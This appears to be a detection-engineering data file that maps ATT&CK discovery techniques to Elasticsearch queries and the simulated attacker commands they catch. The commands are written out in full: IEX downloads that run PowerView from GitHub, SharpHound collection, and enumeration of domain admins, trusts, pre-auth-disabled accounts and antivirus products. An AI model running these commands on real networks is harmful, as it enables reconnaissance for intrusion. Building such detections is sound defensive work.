T1087.002,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"":{""CommandLine"": ""Get-ADObject""}},
                {""match_phrase"": {""CommandLine"": ""-LDAPFilter""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","Try {;
     Import-Module ActiveDirectory -ErrorAction Stop | Out-Null;
      ; }; 
Catch {;
     if((Get-CimInstance -ClassName Win32_OperatingSystem).ProductType -eq 1) {;
   Add-WindowsCapability -Name (Get-WindowsCapability -Name RSAT.ActiveDirectory.DS* -Online).Name -Online;
 } else {;
   Install-WindowsFeature RSAT-AD-PowerShell; 
}; 
};  ;  
Get-ADObject -LDAPFilter '(UserAccountControl:1.2.840.113556.1.4.803:=524288)' -Server $env:UserDnsDomain",2,
T1087.002,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"":{""CommandLine"": ""Get-DomainUser""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; 
IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); 
Get-DomainUser -verbose",（无法运行pws）,
T1018,"{
    ""query"": {
        ""bool"": {       
            ""must"": [
                {""bool"":{
     ""must_not"":[
                        {""match"": {""CommandLine"": ""/all""}},
                 
                    ]
     }
    },
    {""bool"":{
     ""must"":[
                         {""match_phrase"":{""CommandLine"": ""net view""}},
                {""match"":{""CommandLine"": ""domain""}}
      ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","net view /domain 
&& net view",2,
T1018,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"":{""CommandLine"": ""objectcategory=computer""}},
                {""match"": {""CommandLine"": ""-f""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}",12011c_AdFind.exe -f (objectcategory=computer),2,
T1018,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"":{""CommandLine"": ""-sc dclist""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}",12011c_AdFind.exe -sc dclist,2,
T1018,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""bool"":{
     ""must"":[
                        {""wildcard"":{""CommandLine"": ""nltest*""}}
                    ]
     }
    },
    {""bool"": {
                    ""should"":[
                        {""match"": {""CommandLine"": ""/dsgetdc""}},
                        {""match"":{""CommandLine"": ""/dclist""}}
                    ]
                }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","nltest /dsgetdc:$env:USERDOMAIN

nltest.exe /dclist:%userdnsdomain%",2,
T1018,"{
    ""query"": {
        ""bool"": {
            ""should"": [
                {""match_phrase"":{""CommandLine"": ""Get-DomainComputer""}},
                {""match_phrase"":{""CommandLine"": ""Get-DomainController""}},
                {""match_phrase"":{""CommandLine"": ""Get-AdComputer""}},
                {""match_phrase"":{""CommandLine"": ""Get-NetComputer""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","Import-Module .\powerview.ps1;
Get-DomainComputer

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; 
IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); 
Get-DomainController -verbose

Get-AdComputer -Filter *

Import-Module .\PowerView.ps1 -Force;
Get-NetComputer",（无法运行pws））,
T1018,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match"": {""CommandLine"": ""adsisearcher""}},
                {""match_phrase"":{""CommandLine"": ""objectcategory=computer""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","([adsisearcher]""objectcategory=computer"").FindAll(); 
([adsisearcher]""objectcategory=computer"").FindOne()",2,
T1018,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"": {""CommandLine"": ""New-Object System.DirectoryServices.DirectorySearcher""}},
                {""match_phrase"":{""CommandLine"": ""objectcategory=computer""}},
                {""wildcard"":{""CommandLine"": ""*.findall""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","$DirectorySearcher = New-Object System.DirectoryServices.DirectorySearcher(""(ObjectCategory=Computer)""); $DirectorySearcher.PropertiesToLoad.Add(""Name""); 
$Computers = $DirectorySearcher.findall(); 
foreach ($Computer in $Computers) {;
   $Computer = $Computer.Properties.name;
   if (!$Computer) { Continue };
   Write-Host $Computer}",2,
T1018,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""wildcard"":{""CommandLine"": ""nbtstat* -A""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}",nbtstat -A #{remote.host.ip},2,
T1018,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"":{""CommandLine"": ""get-wmiobject""}},
                {""match_phrase"": {""CommandLine"": ""ds_computer""}},
                {""match_phrase"": {""CommandLine"": ""root\\directory\\ldap""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}",get-wmiobject -class ds_computer -namespace root\directory\ldap,2,
T1018,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""bool"":{
     ""must"":[
                        {""match"": {""CommandLine"": ""adidnsdump""}}
                    ]
     }
    },
    {""bool"": {
                    ""should"":[
                        {""match"":{""CommandLine"": ""-u""}},
                        {""match"":{""CommandLine"": ""-p""}},
                        {""match"":{""CommandLine"": ""-zones""}}
                    ]
                }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}",adidnsdump -u domain\user -p password --print-zones 192.168.1.1,2,
T1018,"{
    ""query"": {
        ""bool"": {
            ""should"": [
                {""match"":{""CommandLine"": ""nslookup""}},
                {""match"":{""CommandLine"": ""ping""}},
                {""match_phrase"":{""CommandLine"": ""arp -a""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","$localip = ((ipconfig | findstr [0-9].\.)[0]).Split()[-1]; 
$pieces = $localip.split("".""); 
$firstOctet = $pieces[0]; 
$secondOctet = $pieces[1]; 
$thirdOctet = $pieces[2]; 
foreach ($ip in 1..255 | % { ""$firstOctet.$secondOctet.$thirdOctet.$_"" } ) {cmd.exe /c nslookup $ip}

nslookup #{remote.host.ip}

for /l %i in (1,1,254) do ping -n 1 -w 100 192.168.1.%i

arp -a",2,
T1482,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"":{""CommandLine"": ""objectcategory=organizationalUnit""}},
                {""match"": {""CommandLine"": ""-f""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}",12011c_AdFind.exe -f (objectcategory=organizationalUnit),2,
T1482,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"":{""CommandLine"": ""-sc trustdmp""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}",12011c_AdFind.exe -gcb -sc trustdmp,2,
T1482,"{
    ""query"": {
        ""bool"": {
            ""should"": [
                {""match_phrase"":{""CommandLine"": ""Get-DomainTrust""}},
                {""match_phrase"":{""CommandLine"": ""Get-ForestTrust""}},
                {""match_phrase"":{""CommandLine"": ""Get-NetDomainTrust""}},
                {""match_phrase"":{""CommandLine"": ""Get-NetForestTrust""}},
                {""match_phrase"":{""CommandLine"": ""Get-ADDomain""}},
                {""match_phrase"":{""CommandLine"": ""Get-ADGroupMember""}},
                {""match_phrase"":{""CommandLine"": ""Get-NetDomain""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; 
IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); 
Get-DomainTrust -Verbose

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; 
IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); 
Get-ForestTrust -Verbose

Import-Module .\powerview.ps1 -Force;
Get-NetDomain | ConvertTo-Json -Depth 1

Import-Module ""$env:TEMP\PowerView.ps1""; 
Get-NetDomainTrust; 
Get-NetForestTrust; 
Get-ADDomain; 
Get-ADGroupMember Administrators -Recursive",2,
T1482,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"":{""CommandLine"": ""objectClass=trustedDomain""}},
                {""wildcard"": {""CommandLine"": ""dsquery*""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","dsquery * -filter ""(objectClass=trustedDomain)"" -attr *",2,
T1482,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""wildcard"":{""CommandLine"": ""nltest*""}},
                {""match"": {""CommandLine"": ""/domain_trusts""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}",nltest /domain_trusts,2,
T1016,"{
    ""query"": {
        ""bool"": {       
            ""must"": [
                {""bool"":{
     ""must_not"":[
                        {""match"": {""CommandLine"": ""invoke-command""}},
                 
                    ]
     }
    },
    {""bool"":{
     ""should"":[
                         {""wildcard"": {""CommandLine"": ""ipconfig*""}},
                {""match_phrase"": {""CommandLine"": ""net config""}},
                {""match_phrase"": {""CommandLine"": ""net view /all""}},
      ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","ipconfig

net config workstation

net view /all",2,
T1016,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"":{""CommandLine"": ""objectcategory=subnet""}},
                {""match"": {""CommandLine"": ""-f""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}",12011c_AdFind.exe -f (objectcategory=subnet),2,
T1016,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""wildcard"":{""CommandLine"": ""nbtstat*""}},
                {""match"": {""CommandLine"": ""-n""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}",nbtstat -n,2,
T1016,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""wildcard"": {""CommandLine"": ""netsh*""}},
                {""match"": {""CommandLine"": ""advfirewall""}},
                {""match_phrase"": {""CommandLine"": ""show rule""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}",netsh advfirewall firewall show rule name=all,2,
T1016,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""wildcard"": {""CommandLine"": ""netsh*""}},
                {""match"": {""CommandLine"": ""interface""}},
                {""match_phrase"": {""CommandLine"": ""show interface""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}",netsh interface show interface,2,
T1069.001,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"": {""CommandLine"": ""\\SharpHound""}},
                {""wildcard"": {""CommandLine"": ""*UserDnsDomain""}},
                {""wildcard"": {""CommandLine"": ""*LocalAdmin""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","New-Item -Path ""$env:TEMP\SharpHound\"" -ItemType Directory > $null; 
& ""$env:TEMP\SharpHound.exe"" -d ""$env:UserDnsDomain"" --CollectionMethod LocalAdmin --NoSaveCache --OutputDirectory ""$env:TEMP\SharpHound\""",2,
T1069.001,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""bool"":{
     ""should"":[
                        {""match_phrase"": {""CommandLine"": ""net localgroup""}},
                        {""match_phrase"": {""CommandLine"": ""get-localgroupmember""}}
                    ]
     }
    },
    {""bool"": {
                    ""must"":[
                        {""match"":{""CommandLine"": ""Administrators""}}
                    ]
                }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}
","net localgroup 
&& net localgroup ""Administrators""

get-localgroup; 
Get-LocalGroupMember -Name ""Administrators""",2,
T1069.001,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""wildcard"":{""CommandLine"": ""gpresult*""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}",gpresult /R,2,
T1069.001,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"":{""CommandLine"": ""Get-WmiObject""}},
                {""match_phrase"": {""CommandLine"": ""Win32_Group""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}",Get-WMIObject Win32_Group,2,
T1069.001,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""wildcard"":{""CommandLine"": ""wmic*""}},
                {""match_phrase"": {""CommandLine"": ""get name""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}",wmic.exe group get name,2,
T1069.002,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"":{""CommandLine"": ""get-ADPrincipalGroupMembership""}},
                {""match"":{""CommandLine"": ""administrator""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}",get-ADPrincipalGroupMembership administrator | select name,2,
T1069.002,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"":{""CommandLine"": ""objectcategory=group""}},
                {""match"": {""CommandLine"": ""-f""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}",#{adfind_path} -f (objectcategory=group),2,
T1069.002,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match"": {""CommandLine"": ""adsisearcher""}},
                {""match_phrase"":{""CommandLine"": ""objectcategory=group""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","([adsisearcher]""objectcategory=group"").FindAll(); 
([adsisearcher]""objectcategory=group"").FindOne()",2,
T1069.002,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"":{""CommandLine"": ""Get-AdGroup""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}",Get-AdGroup -Filter *,2,
T1069.002,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"":{""CommandLine"": ""net group""}},
                {""match"": {""CommandLine"": ""domain""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","net localgroup 
&& net group /domain 
&& net group ""domain admins"" /domain 
&& net group ""enterprise admins"" /domain",2,
T1069.002,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""bool"":{
     ""should"":[
                      {""match_phrase"":{""CommandLine"": ""Get-NetLocalGroupMember""}},
                {""match_phrase"":{""CommandLine"": ""Invoke-EnumerateLocalAdmin""}},
                {""match_phrase"":{""CommandLine"": ""Find-LocalAdminAccess""}},
                {""match_phrase"":{""CommandLine"": ""Get-DomainGroup""}},
                {""match_phrase"":{""CommandLine"": ""Get-DomainGroupMember""}}
                    ]
     }
    },
    {""bool"": {
                    ""must"":[
                        {""match_phrase"":{""CommandLine"": ""PowerView.ps1""}}
                    ]
                }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","Import-Module .\powerview.ps1;
$userName = ""#{domain.user.name}"";
$userPassword = ""#{domain.user.password}"";
$secStringPassword = ConvertTo-SecureString $userPassword -AsPlainText -Force;
$credObject = New-Object System.Management.Automation.PSCredential ($userName, $secStringPassword);
Get-NetLocalGroupMember -ComputerName #{remote.host.fqdn} -Credential $credObject

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; 
IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); 
Invoke-EnumerateLocalAdmin  -Verbose

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; 
IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); 
Find-LocalAdminAccess -Verbose

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; 
IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); 
Get-DomainGroup -verbose

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; 
IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); 
Get-DomainGroupMember ""Domain Admins""",2,"
"
T1069.002,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"":{""CommandLine"": ""net? groups""}},
                {""match"": {""CommandLine"": ""/doma*""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","net group /domai ""Domain Admins"" 
&& net groups ""Account Operators"" /doma 
&& net groups ""Exchange Organization Management"" /doma 
&& net group ""BUILTIN\Backup Operators"" /doma",2,
T1069.002,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""bool"":{
     ""must"":[
                        {""match_phrase"": {""CommandLine"": ""get-aduser""}},
                        {""wildcard"": {""CommandLine"": ""pr*""}}
                    ]
     }
    },
    {""bool"": {
                    ""should"":[
                        {""match"":{""CommandLine"": ""DoesNotRequirePreAuth""}},
                        {""match"":{""CommandLine"": ""useraccountcontrol""}}
                    ]
                }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","get-aduser -f * -pr DoesNotRequirePreAuth | where {$_.DoesNotRequirePreAuth -eq $TRUE}

Get-ADUser -Filter 'useraccountcontrol -band 4194304' -Properties useraccountcontrol | Format-Table name",2,
T1069.002,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"":{""CommandLine"": ""Find-GPOComputerAdmin""}},
                {""match"": {""CommandLine"": ""-ComputerName""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; 
IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); 
Find-GPOComputerAdmin -ComputerName $env:COMPUTERNAME -Verbose""",2,
T1010,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"":{""CommandLine"": ""Select-Object MainWindowTitle""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","$x = Get-Process | Where-Object {$_.MainWindowTitle -ne """"} | Select-Object MainWindowTitle;
$a = New-Object -com ""Shell.Application""; 
$b = $a.windows() | select-object LocationName;
write-host ($x | Format-List | Out-String) ($b | Format-List | Out-String)",2,
T1010,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""wildcard"":{""CommandLine"": ""csc*""}},
                {""match_phrase"":{""CommandLine"": ""1b4409_T1010.cs""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe -out:%TEMP%\T1010.exe 1b4409_T1010.cs 
&& %TEMP%\T1010.exe",2,
T1518,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""bool"":{
     ""must"":[
                        {""match_phrase"": {""CommandLine"": ""Get-ItemProperty""}},
                        {""match_phrase"": {""CommandLine"": ""Windows\\CurrentVersion\\Uninstall""}},
                        {""match_phrase"": {""CommandLine"": ""Select-Object""}}
                    ]
     }
    },
    {""bool"": {
                    ""should"":[
                        {""match"": {""CommandLine"": ""DisplayName""}},
                        {""match"": {""CommandLine"": ""DisplayVersion""}},
                        {""match"": {""CommandLine"": ""Publisher""}},
                        {""match"": {""CommandLine"": ""InstallDate""}}
                    ]
                }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table -Autosize; 
Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table -Autosize",2,
T1518,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""bool"":{
     ""must"":[
                        {""match"": {""CommandLine"": ""--version""}}
                    ]
     }
    },
    {""bool"": {
                    ""should"":[
                        {""match"": {""CommandLine"": ""python4""}},
                        {""match"": {""CommandLine"": ""python3""}},
                        {""match"": {""CommandLine"": ""python2""}},
                        {""match"": {""CommandLine"": ""python""}}
                    ]
                }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}",python3 --version&python2 --version&python --version,2,
T1518,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"":{""CommandLine"": ""reg query""}},
                {""match_phrase"":{""CommandLine"": ""Software\\Microsoft\\Internet Explorer""}},
                {""match"": {""CommandLine"": ""svcVersion""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","reg query ""HKEY_LOCAL_MACHINE\Software\Microsoft\Internet Explorer"" /v svcVersion",2,
T1518,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"":{""CommandLine"": ""Get-ItemProperty""}},
                {""match_phrase"":{""CommandLine"": ""Software\\Microsoft\\Internet Explorer""}},
                {""wildcard"": {""CommandLine"": ""*Version""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}",(Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Internet Explorer').Version,2,
T1518.001,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"": {""CommandLine"": ""get-uac""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}",echo $(get-uac),2,
T1518.001,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""bool"":{
     ""must"":[
                        {""match_phrase"": {""CommandLine"": ""root\\SecurityCenter2""}},
                        {""match"": {""CommandLine"": ""AntiVirusProduct""}}
                    ]
     }
    },
    {""bool"": {
                    ""should"":[
                        {""wildcard"":{""CommandLine"": ""wmic*""}},
                        {""match_phrase"":{""CommandLine"": ""Get-WmiObject""}}
                    ]
                }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","wmic /NAMESPACE:\\root\SecurityCenter2 PATH AntiVirusProduct GET /value

wmic.exe /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List

$NameSpace = Get-WmiObject -Namespace ""root"" -Class ""__Namespace"" | Select Name | Out-String -Stream | Select-String ""SecurityCenter"";
$SecurityCenter = $NameSpace | Select-Object -First 1;
Get-WmiObject -Namespace ""root\$SecurityCenter"" -Class AntiVirusProduct | Select DisplayName, InstanceGuid, PathToSignedProductExe, PathToSignedReportingExe, ProductState, Timestamp | Format-List;",2,
